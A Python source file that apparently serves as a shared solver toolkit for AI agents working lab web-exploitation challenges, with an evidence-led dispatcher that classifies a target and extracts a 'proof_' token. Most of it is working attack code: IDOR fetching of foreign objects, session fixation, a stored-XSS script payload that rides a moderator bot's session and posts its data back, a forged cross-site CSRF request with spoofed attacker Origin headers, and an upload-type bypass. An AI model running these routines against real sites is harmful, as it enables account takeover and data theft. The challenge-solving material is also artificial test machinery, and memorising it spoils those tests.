#!/usr/bin/env python3
"""Shared recovery toolkit for the restored day-21/day-22 web-exploitation solvers.

Folds the per-attempt solve.py copies scattered across `workers/web/<family>/<mode>/`
for curriculum days 06-10 (release days 21 and 22) into one reusable reference, the
same way day-19/day-20's `common.py` already did for their own days. Read this (and
the per-day `solve.py`/`NOTES.md` next to it) before investigating a new web target;
see `docs/web-worker-lessons.md` for the evidence-led classification discipline this
follows and how it fits the earlier day-19/day-20/day-05 references.

Stdlib only. Every function here only ever talks to the ONE target origin it is
given (never the Game Master): no HUNTRESS_GM_TOKEN, no start/submit, no timed or
retry switches. This file makes no network calls at import time and holds no
credential of any kind. Port the recovery logic you need into your current job's
own authored solver; do not import or execute this module against a live target
without first reading it (per policy, treat its output as reference, not an
oracle), and never edit this shared tree from a worker's job.

Mastery is cumulative: a target's bug class is never assumed from the challenge's
own name. `classify_and_recover` tries each recognized class in the evidence-led
order below (same order the restored day-19/day-20 dispatcher used, extended with
the three classes day-21 added and the one day-22 added) and returns `None` if a
target's evidence does not match anything known yet - that is a real signal for a
new class, not a bug in this dispatcher.
"""
import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar
from html.parser import HTMLParser

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")  # some lanes 1010-block urllib's default UA
TIMEOUT = 30
DELAY = 0.8  # polite pacing between requests to the same target, matching the restored notes
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Links(HTMLParser):
    """Collects <a href> targets from a page, for directory-index and dashboard parsing."""

    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for key, value in attrs:
                if key == "href" and value:
                    self.hrefs.append(value)


class Target:
    """Paced, cookie-jarred HTTP client scoped to exactly one assigned target origin.

    Refuses any URL outside its own origin (artifact/evidence links must never be
    followed off-target), and can optionally save every response for an evidence
    trail the way the restored notes record one."""

    def __init__(self, base_url, evidence_dir=None):
        self.base = base_url.rstrip("/")
        self.evidence_dir = evidence_dir
        self._requests = 0
        self.cookiejar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookiejar))
        if evidence_dir:
            evidence_dir.mkdir(parents=True, exist_ok=True)

    def _save(self, name, status, body):
        if not self.evidence_dir or not name:
            return
        (self.evidence_dir / f"{name}.meta.json").write_text(json.dumps({"status": status}, indent=2))
        (self.evidence_dir / f"{name}.body").write_text(body)

    def request(self, path_or_url, method="GET", data=None, headers=None, save=None):
        if self._requests:
            time.sleep(DELAY)
        self._requests += 1
        url = path_or_url if path_or_url.startswith("http") else self.base + path_or_url
        if not url.startswith(self.base):
            raise ValueError(f"refusing out-of-scope URL: {url}")
        body = json.dumps(data).encode() if data is not None else None
        hdrs = {"User-Agent": UA}
        if data is not None:
            hdrs["Content-Type"] = "application/json"
        hdrs.update(headers or {})
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with self.opener.open(req, timeout=TIMEOUT) as resp:
                status, text = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:  # 4xx/5xx bodies are still evidence
            status, text = err.code, err.read().decode("utf-8", "replace")
        self._save(save, status, text)
        return status, text

    def get(self, path, headers=None, save=None):
        return self.request(path, "GET", headers=headers, save=save)

    def get_json(self, path, headers=None, save=None):
        status, body = self.get(path, headers=headers, save=save)
        return status, (json.loads(body) if status == 200 else None)

    def post_json(self, path, payload, headers=None, save=None):
        status, body = self.request(path, "POST", data=payload, headers=headers, save=save)
        return status, (json.loads(body) if body else None)


# --------------------------------------------------------------------------- recoverers
# Each takes a Target (and whatever evidence the dispatcher already gathered) and
# returns the proof_<hex> string, or None if its class's evidence does not pan out.

def rec_backup(t):
    """Root crawler-policy hint -> robots.txt Disallow -> open directory index -> named
    backup file -> proof. No wordlists: every path comes from the previous response.
    Source: day-19 backup-exposure; restored again (independently) in day-20's common.py,
    day-21 and day-22's mastery targets."""
    status, robots = t.get("/robots.txt", save="robots")
    if status != 200:
        return None
    for d in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", robots):
        d = "/" + d.strip("/") + "/"
        status, index = t.get(d, save="index" + d.replace("/", "_"))
        if status != 200:
            continue
        parser = Links()
        parser.feed(index)
        members = [h for h in parser.hrefs if h.rstrip("/").split("/")[-1]]
        # backup-looking names first, but try every listed member - the dispatcher does
        # not assume which one carries the proof.
        members.sort(key=lambda h: 0 if re.search(
            r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json|txt|env)(\.|$)", h, re.I) else 1)
        for href in members:
            path = href if href.startswith("/") else d + href
            status, body = t.get(path, save="file_" + path.strip("/").replace("/", "_"))
            if status != 200:
                continue
            match = PROOF_RE.search(body)
            if match:
                return match.group(0)
    return None


def rec_idor(t, html):
    """Dashboard sets a session cookie and links an activity feed plus per-object pages.
    An object page's inline fetch() discloses the object-API URL template; the feed
    discloses a foreign object id (owner != current_user, or visibility reference_only);
    request that id with the same session - no ownership check stops it.
    Source: day-19 idor; restored again in day-21/day-22 mastery (Incident Picnic app)."""
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    if not feed or not case_links:
        return None
    my_ids = {int(link.rsplit("/", 1)[1]) for link in case_links}
    status, case_page = t.get(case_links[0], save="mycase")
    api_template = None
    inline = re.search(r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', case_page)
    if inline:
        api_template = (inline.group(1), inline.group(3))
    status, feed_body = t.get(feed, save="feed")
    try:
        feed_json = json.loads(feed_body)
    except ValueError:
        return None
    me = feed_json.get("current_user")
    foreign_ids = []
    for event in feed_json.get("events", []):
        case_id = event.get("case_id") or event.get("id")
        if case_id is None:
            continue
        if (event.get("owner") and event.get("owner") != me) or \
                event.get("visibility") == "reference_only" or case_id not in my_ids:
            foreign_ids.append(case_id)

    def object_urls(case_id):
        if api_template:
            yield f"{api_template[0]}{case_id}{api_template[1]}"
        kind = case_links[0].rsplit("/", 2)[-2]
        yield f"/api/{kind}/{case_id}"

    for case_id in dict.fromkeys(foreign_ids):
        for url in dict.fromkeys(object_urls(case_id)):
            status, body = t.get(url, save=f"obj_{case_id}")
            if status == 200:
                match = PROOF_RE.search(body)
                if match:
                    return match.group(0)
                break
    return None


def rec_session_fixation(t, clues):
    """`/api/clues` -> feature_route/secondary_route/session_hint. "Plant" the client-
    chosen session id on feature_route (the app adopts it as its session cookie), then
    "stroll" the secondary_route with that same planted id to collect the proof.
    Source: day-08-session-impression (curriculum day 8, release day 21) - this
    family's own bug, also seen mixed into day-21/day-22 mastery targets."""
    sid, feature, secondary = clues["session_hint"], clues["feature_route"], clues["secondary_route"]
    status, plant = t.get_json(feature + "?" + urllib.parse.urlencode({"sid": sid}), save="plant")
    if not plant or not plant.get("session_established"):
        return None
    status, stroll = t.get_json(secondary + "?" + urllib.parse.urlencode({"sid": sid}), save="stroll")
    proof = (stroll or {}).get("evidence", "").strip()
    return proof if PROOF_RE.fullmatch(proof) else None


def rec_reflect_callback(t, clues):
    """`/api/clues` -> feature_route/secondary_route/callback_nonce (Fastify Search
    Mirror). feature_route reflects a query param verbatim (reflected XSS sink); an
    isolated browser visiting `<img src=x onerror=fetch(secondary_route?nonce=...)>`
    would load secondary_route with browser trust signals, which releases the proof.
    Source: day-06-reflect-upon-this (curriculum day 6, release day 21) - this
    family's own bug."""
    feature, secondary, nonce = clues["feature_route"], clues["secondary_route"], clues["callback_nonce"]
    probe = "reflectprobeZZ9"
    status, page = t.get(f"{feature}?q={urllib.parse.quote(probe)}", save="reflect_probe")
    if probe not in page:
        return None
    status, callback_body = t.get(
        f"{secondary}?nonce={urllib.parse.quote(nonce)}",
        headers={"Referer": f"{t.base}{feature}?q=test"}, save="callback")
    match = re.search(r'"evidence"\s*:\s*"(proof_[0-9a-fA-F]+)"', callback_body)
    return match.group(1) if match else None


def rec_stored_xss_bot(t, clues):
    """`/api/clues` -> feature_route (a /<collection> submission form) plus
    moderator_data_route and receipt_route_template. A posted message's content is
    stored and rendered unescaped; a moderator bot opens it in an authenticated
    browser. The stored payload fetches moderator_data_route same-origin (riding the
    bot's session) and POSTs the result back to this message's own receipt route;
    poll the message page for the moderator-receipt block.
    Source: day-07-stored-xss (curriculum day 7, release day 21) - this family's
    own bug ("Kind Regards" / "Feedback Loop" apps)."""
    data_route = clues["moderator_data_route"]
    receipt_template = clues["receipt_route_template"]
    collection_match = re.search(r"/api/([a-z0-9_-]+)/\{id\}", receipt_template)
    if not collection_match:
        return None
    collection = collection_match.group(1)
    submit_route, view_route = f"/api/{collection}", f"/{collection}"

    status, placeholder = t.post_json(submit_route, {"message": "placeholder"}, save="submit_placeholder")
    if not placeholder or "id" not in placeholder:
        return None
    payload_id = placeholder["id"] + 1
    receipt_route = receipt_template.replace("{id}", str(payload_id))
    payload = ("<script>fetch(%r,{credentials:'include'})"
               ".then(function(r){return r.text()})"
               ".then(function(t){return fetch(%r,{method:'POST',"
               "headers:{'Content-Type':'application/json'},body:JSON.stringify({evidence:t})})});"
               "</script>" % (data_route, receipt_route))
    status, posted = t.post_json(submit_route, {"message": payload}, save="submit_payload")
    if not posted or posted.get("id") != payload_id:
        return None  # id skew: a fresh attempt must recompute receipt_route for the real id

    receipt_re = re.compile(r"Moderator receipt</strong><pre>(.*?)</pre>", re.S)
    for attempt in range(12):  # bounded polling for the moderator bot to visit; ~6s apart
        time.sleep(6.0)
        status, page = t.get(f"{view_route}/{payload_id}", save=f"poll_{attempt}")
        if status != 200:
            continue
        match = receipt_re.search(page)
        if match:
            proof = PROOF_RE.search(match.group(1))
            return proof.group(0) if proof else match.group(1).strip()
    return None


def rec_csrf(t, clues):
    """`/api/clues` -> feature_route (a state-changing endpoint reachable by plain GET,
    with a cosmetic csrf_token that is never actually checked). Forge that GET with
    cross-site Origin/Referer/Sec-Fetch-Site headers while riding the session already
    established on this client - exactly what a real cross-site <img>/<form> GET CSRF
    would do - then read the preferences-route "changed_across_sites"/"evidence".
    Source: day-09-forged-with-care (curriculum day 9, release day 22) - this
    family's own bug ("Notification Nook" app)."""
    feature_route = clues["feature_route"]
    status, prefs_html = t.get("/preferences", save="preferences")
    token_match = re.search(r"name=['\"]csrf_token['\"] value=['\"]([^'\"]+)['\"]", prefs_html)
    csrf_token = token_match.group(1) if token_match else ""
    dest_match = re.search(r"<option value=['\"]([^'\"]+)['\"]>External review mailbox</option>", prefs_html)
    destination = dest_match.group(1) if dest_match else "review@outside.example.invalid"
    forge_url = f"{feature_route}?destination={destination}&csrf_token={csrf_token}"
    t.get(forge_url, headers={
        "Origin": "https://attacker.example.invalid", "Referer": "https://attacker.example.invalid/csrf.html",
        "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document"}, save="forge")
    status, final = t.get_json("/api/preferences", save="final_preferences")
    return (final or {}).get("evidence")


def rec_upload_bypass(t, clues):
    """`/api/clues` -> feature_route (upload) and render_route (preview). The stated
    policy (".txt only") is never actually enforced on filename extension or
    content_type: uploading a `.html` filename routes to the staff HTML-preview path
    instead of the plain-text path, and that preview evaluates a `{{objective}}`
    placeholder the server fills in with the proof.
    Source: day-10-uploading-expectations (curriculum day 10, release day 22) -
    this family's own bug."""
    upload_route, render_route = clues["feature_route"], clues["render_route"]
    status, upload = t.post_json(upload_route, {
        "filename": "proof-recovery.html", "content": "{{objective}}", "content_type": "text/html"
    }, save="upload")
    if not upload or "path" not in upload or not upload["path"].startswith(render_route):
        return None
    status, rendered = t.get(upload["path"], save="rendered")
    return rendered.strip() if status == 200 else None


def classify_and_recover(t, evidence=None):
    """Evidence-led dispatcher: GET / once, then try each recognized class in order.

    Mirrors the restored day-19/day-20 dispatcher order (admin/clues-driven apps
    before generic API/IDOR signs, since both link /api/ paths; PHP-viewer/LFI
    evidence before SQLi; backup-exposure investigated last since its only tell is
    a vague comment). Extend this - do not assume a form is SQLi or that an unknown
    page is backup exposure. `evidence` (a dict) is filled in for the caller's notes
    if given; this function never talks to anything but `t`'s own origin."""
    evidence = evidence if evidence is not None else {}
    status, html = t.get("/", save="root")
    evidence["root_status"] = status
    if status != 200:
        evidence["classification"] = "root request failed"
        return None

    # Always try the clues API directly rather than gating on root HTML literally
    # containing "/api/clues": the day-07 app only discloses it via /openapi.json,
    # not a root-page link, so a text pre-filter misses it. A non-200 here just
    # means this app has no clues API; fall through to the other classes.
    clues_status, clues = t.get_json("/api/clues", save="clues")
    if clues_status == 200 and clues:
        evidence["clues"] = clues
        if clues.get("session_hint") and clues.get("feature_route") and clues.get("secondary_route"):
            evidence["classification"] = "session fixation"
            proof = rec_session_fixation(t, clues)
            if proof:
                return proof
        if clues.get("callback_nonce") and clues.get("feature_route") and clues.get("secondary_route"):
            evidence["classification"] = "reflected XSS + isolated browser callback"
            proof = rec_reflect_callback(t, clues)
            if proof:
                return proof
        if clues.get("moderator_data_route") and clues.get("receipt_route_template"):
            evidence["classification"] = "stored XSS (moderator bot)"
            proof = rec_stored_xss_bot(t, clues)
            if proof:
                return proof
        if clues.get("render_route") and clues.get("feature_route"):
            evidence["classification"] = "upload content-type/extension bypass"
            proof = rec_upload_bypass(t, clues)
            if proof:
                return proof
        if clues.get("feature_route") and "preferences_route" in clues:
            evidence["classification"] = "CSRF (state-changing GET)"
            proof = rec_csrf(t, clues)
            if proof:
                return proof

    if re.search(r'href="(/api/[^"]+)"', html) and re.findall(r'href="(/[a-z]+/\d+)"', html):
        evidence["classification"] = "IDOR"
        proof = rec_idor(t, html)
        if proof:
            return proof

    if re.search(r"crawler polic|robots", html, re.I):
        evidence["classification"] = "backup exposure"
        proof = rec_backup(t)
        if proof:
            return proof

    # last resort: try backup exposure even without the comment hint, as the day-08
    # mastery dispatcher did.
    evidence.setdefault("classification", "unclassified; tried backup exposure as a last resort")
    return rec_backup(t)
